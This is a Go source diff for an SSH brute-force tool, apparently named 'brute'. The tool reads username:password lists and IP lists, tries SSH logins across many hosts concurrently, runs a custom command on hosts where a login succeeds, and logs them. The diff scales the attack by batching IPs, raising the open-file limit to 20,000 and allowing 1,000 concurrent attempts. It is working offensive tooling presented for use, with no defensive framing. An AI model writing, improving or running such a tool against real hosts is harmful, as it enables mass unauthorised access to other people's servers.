@@ -9,6 +9,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"syscall"
 
 	"github.com/fatih/color"
 	"golang.org/x/crypto/ssh"
@@ -141,6 +142,22 @@ func checkConnectionForIP(user, pass, command, ip, port string) {
 	handleGoodConnection(ip, user, pass, output, port)
 }
 
+func processIPBatch(user, pass, command, port string, ipBatch []string) {
+	for _, ip := range ipBatch {
+		// Acquire semaphore
+		semaphore <- struct{}{}
+		wg.Add(1)
+		go func(user, pass, command, ip, port string) {
+			defer wg.Done()
+			defer func() {
+				// Release semaphore
+				<-semaphore
+			}()
+			checkConnectionForIP(user, pass, command, ip, port)
+		}(user, pass, command, ip, port)
+	}
+}
+
 func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
 	upf, err := os.Open(userpassFile)
 	if err != nil {
@@ -149,12 +166,12 @@ func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
 	}
 	defer upf.Close()
 
-	semaphore = make(chan struct{}, threads)
-
+	// Print banner and start message
 	printBanner()
 	fmt.Printf("\n\n\033[01;34m[\033[01;31m▶\033[01;34m] \033[01;34mBrute Started\033[0m\n\n")
 
-	scanner := bufio.NewScanner(upf)
+	// Create a buffered reader for the userpass file
+	scanner := bufio.NewScanner(bufio.NewReader(upf))
 	for scanner.Scan() {
 		userPass := scanner.Text()
 		parts := strings.SplitN(userPass, ":", 2)
@@ -171,22 +188,23 @@ func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
 			}
 			defer ipf.Close()
 
-			scannerIP := bufio.NewScanner(ipf)
+			// Use buffered reader for IP list
+			scannerIP := bufio.NewScanner(bufio.NewReader(ipf))
+
+			var ipBatch []string
 			for scannerIP.Scan() {
 				ip := scannerIP.Text()
+				ipBatch = append(ipBatch, ip)
 
-				// Acquire semaphore
-				semaphore <- struct{}{}
-				wg.Add(1)
-				go func(user, pass, command, ip, port string) {
-					defer wg.Done()
-					defer func() {
-						// Release semaphore
-						<-semaphore
-					}()
-					checkConnectionForIP(user, pass, command, ip, port)
-				}(user, pass, command, ip, port)
+				// Process IP batch when it reaches a certain size
+				if len(ipBatch) >= 1000 {
+					processIPBatch(user, pass, command, port, ipBatch)
+					ipBatch = nil
+				}
 			}
+
+			// Process any remaining IPs
+			processIPBatch(user, pass, command, port, ipBatch)
 		} else {
 			warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
 			color.Cyan(warningMessage)
@@ -279,6 +297,19 @@ func logToFile(file *os.File, logEntry string) {
 }
 
 func main() {
+	// Increase the file descriptor limit
+	var rLimit syscall.Rlimit
+	rLimit.Max = 20000 // You may need to adjust this based on your system's capacity
+	rLimit.Cur = 20000
+	err := syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
+	if err != nil {
+		handleError(NewCustomError(fmt.Sprintf("Error setting file descriptor limit: %s", err)))
+		os.Exit(1)
+	}
+
+	// Adjust semaphore buffer size
+	semaphore = make(chan struct{}, 1000) // Set to a reasonable value based on your system's capacity
+
 	// Usage message with information about the -S option
 	usage := "Usage: ./brute <userpass file> <custom command> <ip list file> <port> <threads> [-S <IP segment>]"
 
